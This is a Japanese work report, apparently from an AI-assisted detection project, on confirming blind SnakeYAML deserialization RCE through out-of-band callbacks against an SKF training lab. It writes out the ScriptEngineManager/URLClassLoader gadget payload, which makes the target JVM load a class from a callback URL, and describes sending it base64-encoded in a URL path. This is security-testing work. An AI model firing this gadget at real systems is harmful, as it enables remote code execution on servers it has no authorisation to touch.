---
task_id: SGK-2026-0498
doc_type: work_report
status: done
parent_task_id: SGK-2026-0442
related_docs:
- docs/shigoku/plans/done/2026-09-14_sgk-2026-0498_java-snakeyaml-oob-deserialization.md
- docs/shigoku/worklogs/2026-09-14_sgk-2026-0498_java-snakeyaml-oob-deserialization_work_log.md
- docs/shigoku/plans/done/2026-09-14_sgk-2026-0496_oob-deserialization.md
- docs/shigoku/specs/2026-09-01_sgk-2026-0465_detection-capability-map.md
tags:
- shigoku
- detection
- deserialization
- java
- oob
- confirmation-bar
created_at: '2026-09-14'
updated_at: '2026-09-14'
---

# SGK-2026-0498 作業完了報告 — Java(SnakeYAML) OOB デシリアライズ(RCE級)を実対象で本物確定（◎）

## 何をしたか / なぜ

デシリアライズ・クラス（0496 で Python pickle が ◎）を **Java(SnakeYAML)** へ横展開。実対象は
**SKF `java-des-yaml`**（`GET /config/{base64}` → base64 デコード後の YAML を `new Yaml().load()`。
SnakeYAML 1.25・JDK 8u212・port 5000・`--network host` で起動）。in-band は 500・空（ブラインド）だが、
SnakeYAML の ScriptEngineManager ガジェットで標的の JVM が我々の OOB 受信器へ外向き取得することを実測し確定。

## 真因の切り分け（誤認の訂正）

当初「コールバックが届かず Java は不通」と誤認したが、これは**我々のリスナーのバグ**だった。JVM は 13337 に
直接到達できる（`jrunscript` で 200・受信ログ確認）。真因は `LocalOOBListener` のルートが
`/callback/{token}`・`/{token}` の**単一セグメント**のみで、ServiceLoader が付ける多段パス
`/callback/<token>/META-INF/services/...` に一致せず token 配下に記録されなかったこと。tail ルート追加で解消。

## 実装（非凍結中心＋承認済み凍結1）

- **oob_listener.py（非凍結）**: tail ルートを additive 追加（`/callback/{token}/{tail:.*}`・`/{token}/{tail:.*}`。
  `/callback/` 付きを先に登録し token 誤取得を防止）。多段パスを token 配下に記録。
- **oob_payload_builders.py（非凍結）**: builder `java_snakeyaml`（`!!javax.script.ScriptEngineManager
  [!!java.net.URLClassLoader [[!!java.net.URL ["<callback>/"]]]]` を bytes 返し・callback を末尾 '/' で
  ベース URL 化）。
- **smart_blind_deser.py（非凍結）**: `path` モード（base64 を URL パス末尾に付けて GET）＋ GET 送信＋
  モード/kind 別の正確な PoC。PoC はプレースホルダでなく**実際に送った完全 URL（base64 本体込み）**、
  生受信ログ（全インバウンド行＋User-Agent）を提示。
- **oob_provider.py（非凍結）**: `poll` の戻りに同一 token の**全インバウンド行**（`interactions`）を additive
  追加（既存 consumer は特定キーのみ参照＝安全）。
- **sealed_reproduction_checker.py（凍結・承認）**: `_check_oob_replay` に `path`(GET) モードを additive 追加
  （builder=java_snakeyaml＋base64 を URL パス末尾に付けて GET・fresh callback で作り直し）。
- **payout_grade.py は無改変**（汎用マーカー `oob_interaction_received` が vuln_type=deserialization を既に網羅）。

## 結果（独立検証・Claude が実測）

- **実 SKF `java-des-yaml`** で実 `SmartOOBDeserHunter.execute`（path/java_snakeyaml/base64）が OOB で自走検出。
  標的 JVM が `HEAD/GET /callback/<token>/META-INF/services/javax.script.ScriptEngineFactory` と
  `GET /callback/<token>/OK.class`（返したクラス名の取得）を User-Agent `Java/1.8.0_212` で叩いた。
  → **GATE1 `payout_grade=True/oob_interaction_received`**。
- **GATE2**: 実 `SealedReproductionChecker` が**新 token**で builder→base64→path GET を封印内再送し、JVM が
  新 token でコールバック→**matched**（`reproduction_marker_matched:oob_interaction_received`）。
- **GATE3**: 本物の poc_judge（実 LLM）で **is_real=True・has_actual_impact=True・counter_evidence=False・
  needs_human=False**。審査理由は「URL パス中 base64 は ScriptEngineManager ガジェット・唯一の token が受信器の
  インバウンドパスに出現・Java/1.8.0_212 の UA・META-INF 取得→攻撃者指定クラス取得という SnakeYAML 特有の
  シグネチャ・標的自身の JVM が発信＝RCE 級デシリアライズの決定的証拠」。**完全3ゲート達成＝◎**。
  - 初回 poc_judge は false（PoC がプレースホルダ・生受信ログ不足）→**実 base64 URL＋全インバウンド行＋
    User-Agent＋OK.class 取得**を提示して再送し承認（[[poc-judge-raw-evidence]] の再現＝生証拠が要件）。
- テスト: 新規（builder java_snakeyaml／engine path モード＝payout_grade 発火・GET/base64 パス送信・実 base64
  PoC・JVM UA・replay 記述子・非脆弱で不確定／sealed path モード matched）。関連 OOB/deser/provider 35 緑。
  非回帰: 失敗3件（phase_b×2＝workspace 成果物不在・t3_hybrid budget）は本変更前でも失敗する既存＝
  **0498 起因の回帰ゼロ**（1339 passed）。
- 凍結3（poc_judge.md／task_queue.py／finding_validator.py）exit 0（無改変）。承認済凍結1（sealed）は
  承認範囲の additive 追加のみ。製品非依存トークン 0・trailing whitespace 0・秘密値非露出。

## 確度の結論（正直な格付け）

- **Java(SnakeYAML) OOB デシリアライズ＝RCE 級で実害あり**、実 poc_judge も通り **◎（完全3ゲート）**。
  curve-fit なし（payout_grade 無改変・汎用マーカー・PoC は実バイト列＋生受信ログ・シナリオは task 由来）。
  **高度化 中(L2)**（SnakeYAML 1.25 の ScriptEngineManager 単一ガジェット・SKF 単一・ネイティブ Java
  シリアライズ/JNDI/DNS-only は別途）。コールバックは良性（受信器への HTTP GET のみ・非破壊確認）。

## 完了条件の充足

計画の完了条件 1〜5 をすべて充足（条件3 の実 poc_judge を承認で達成）。`in_scope_blocker=0`。

## 参考にしたルール

CLAUDE.md §14/§15/§16/§17/§19、`rules/lessons.md`（実対象到達の証明・一ファイルの挙動を仕様としない）、
`rules/codingrules.md`（bare except 禁止・秘密非露出・境界のみ noqa・明示タイムアウト）、メモリ
[[no-capability-minimization]]・[[poc-judge-raw-evidence]]・[[detection-capability-wiring-map]]・
[[skf-labs-ssti-crlf]]。

## 非阻害の観測（deferred / 別件）

- **PHP のオブジェクト注入（unserialize）は本タスクで実装不可と結論**: 制御可能なラボが無く、POP チェーンは
  アプリ固有（クラス集合依存）＝汎用実装できない（OOB SQLi と同型の据え置き）。
- SnakeYAML 以外の Java ガジェット（ysoserial 系ネイティブ Java シリアライズ・JNDI/LDAP）・DNS-only OOB・
  自前ホスト interactsh（実インターネット標的）・パイプライン統合は `deferred_followup`。
